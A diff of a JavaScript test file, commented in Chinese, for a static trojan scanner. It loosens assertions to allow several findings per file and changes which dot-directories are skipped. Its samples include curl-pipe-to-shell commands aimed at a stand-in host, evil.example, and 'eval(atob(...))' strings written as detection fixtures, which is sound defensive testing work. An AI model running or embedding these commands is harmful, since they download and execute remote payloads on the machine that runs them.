@@ -30,7 +30,7 @@ function scanOne(t, content, opts = {}) {
 
 // ── 1. 5 类 TROJAN_PATTERNS 命中 / 近失 / 大小写 / \u0065val 混淆 ────────────
 
-test('scanDir: 5 类木马模式逐一命中（每文件只报首个命中模式）', (t) => {
+test('scanDir: 5 类木马模式逐一命中（同一文件报出全部命中模式）', (t) => {
   const hits = [
     ['TROJAN_REMOTE_EXEC', "execSync('curl https://evil.example/payload.sh') | sh"],
     ['TROJAN_DOWNLOAD_EXEC', "const u = 'curl https://evil.example/payload.sh | sh';"],
@@ -41,9 +41,10 @@ test('scanDir: 5 类木马模式逐一命中（每文件只报首个命中模式
   assert.equal(hits.length, TROJAN_PATTERNS.length, '矩阵与模式表一一对应');
   for (const [code, payload] of hits) {
     const f = scanOne(t, payload);
-    assert.equal(f.length, 1, code + ' 应命中');
-    assert.equal(f[0].code, code, code + ' 命中码正确');
-    assert.equal(f[0].severity, 'high');
+    const codes = f.map((x) => x.code);
+    assert.ok(codes.includes(code), code + ' 应命中');
+    assert.ok(f.length >= 1, code + ' 至少一条发现');
+    assert.ok(f.every((x) => x.severity === 'high'), code + ' 命中的 severity 均为 high');
   }
 });
 
@@ -63,8 +64,8 @@ test('scanDir: 5 类模式近失样本不误报', (t) => {
 
 test('scanDir: 模式大小写不敏感（i 标志）', (t) => {
   const f = scanOne(t, "EXECSYNC('CURL https://evil.example/p.sh') | SH");
-  assert.equal(f.length, 1);
-  assert.equal(f[0].code, 'TROJAN_REMOTE_EXEC');
+  assert.ok(f.length >= 1);
+  assert.ok(f.map((x) => x.code).includes('TROJAN_REMOTE_EXEC'));
 });
 
 test('scanDir: \\u0065val 混淆不检测（静态扫描刻意保守，不解码字符串转义）', (t) => {
@@ -121,14 +122,16 @@ test('scanDir: maxFindings 上限（发现数 ≤ 上限）', (t) => {
   assert.ok(findings.length <= 5);
 });
 
-test('scanDir: 点目录（.pnpm 与任意点开头）默认跳过', (t) => {
+test('scanDir: 点目录默认只跳过 .pnpm（任意点目录不再盲跳）', (t) => {
   const dir = tmp(t);
   fs.mkdirSync(path.join(dir, '.pnpm'), { recursive: true });
   fs.mkdirSync(path.join(dir, '.hidden'), { recursive: true });
   fs.writeFileSync(path.join(dir, '.pnpm', 'evil.js'), "eval(atob('x'))");
   fs.writeFileSync(path.join(dir, '.hidden', 'evil.js'), "eval(atob('x'))");
-  assert.deepEqual(scanDir({ root: dir }), [], '默认跳过点目录');
-  assert.ok(scanDir({ root: dir, skipDotDirs: false }).length >= 2, '关闭跳过后命中');
+  const findings = scanDir({ root: dir });
+  assert.ok(findings.some((f) => f.file.includes(path.sep + '.hidden' + path.sep)), '.hidden 默认被扫描');
+  assert.ok(!findings.some((f) => f.file.includes(path.sep + '.pnpm' + path.sep)), '.pnpm 仍被跳过');
+  assert.ok(scanDir({ root: dir, skipDotDirs: false }).length >= 2, '关闭跳过后两者都命中');
 });
 
 test('scanDir: builtinNames 命中 package.json name 时豁免整个包', (t) => {
